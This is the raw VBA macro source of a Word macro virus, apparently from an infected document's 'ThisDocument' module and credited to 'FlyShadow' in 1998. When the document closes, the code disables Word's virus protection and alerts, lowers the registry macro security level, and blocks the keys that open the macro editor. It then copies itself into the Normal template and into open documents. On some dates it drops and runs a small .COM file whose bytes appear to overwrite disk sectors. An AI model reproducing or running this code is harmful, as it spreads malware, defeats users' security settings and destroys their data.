   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Copyright (C) 1998 by FlyShadow ~^^~ - Spoony
   Private Declare Function SystemParametersInfoA Lib "user32" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
   Private Sub Document_Close(): Dim £h As Byte
   On Error Resume Next
   £o = ActiveDocument.Saved
   Options.VirusProtection = 0
   Options.SaveNormalPrompt = 0
   Application.DisplayAlerts = 0
   Options.ConfirmConversions = 0
   Application.EnableCancelKey = 0
   SystemParametersInfoA 97, 1, "", 0
   CustomizationContext = MacroContainer
   CommandBars("Control Toolbox").Enabled = 0
   CommandBars("Tools").Controls(12).Visible = 0
   FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
   FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

   If Month(Now) Like Day(Now) Or Day(Now) Like WeekDay(Now) Then _
   £e = Array(&HFA, &H33, &HC9, &H8B, &HD1, &HFE, &HC1, &H80, &HD6, &H0, &HA, &HC9, &H75, &H2, &HFE, &HC1, &HB2, &H80, &HB8, &H1, &H3, &H9A, &HEE, &H3, &H70, &H0, &HEB, &HE9): _
   Open "C:\ÿ.COM" For Binary As #1: For £d = 0 To 27: £h = £e(£d): Put #1, £d, £h: Next: Close: Shell "C:\ÿ.COM", 0

   If GetAttr(NormalTemplate.FullName) Mod 2 Then SetAttr NormalTemplate.FullName, 0
   If GetSetting("'", "'", "'") Like "" Then SaveSetting "'", "'", "'", ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 50)

   If GetAttr(NormalTemplate.FullName) Then
   With NormalTemplate.VBProject
   If Not .Protection And .HelpContextID <> 7 Then
   .VBComponents(1).CodeModule.DeleteLines 1, .VBComponents(1).CodeModule.CountOfLines
   .VBComponents(1).CodeModule.AddFromString GetSetting("'", "'", "'")
   .HelpContextID = 7
   End If: End With: End If

   If Len(ActiveDocument.Path) Then
   With ActiveDocument.VBProject
   If Not .Protection And .HelpContextID <> 7 Then
   .VBComponents(1).CodeModule.DeleteLines 1, .VBComponents(1).CodeModule.CountOfLines
   .VBComponents(1).CodeModule.AddFromString GetSetting("'", "'", "'")
   .HelpContextID = 7
   If Not ActiveDocument.ReadOnly Then ActiveDocument.SaveAs ActiveDocument.FullName
   End If: End With: End If

   SystemParametersInfoA 97, 0, "", 0
   ActiveDocument.Saved = £o
   End Sub
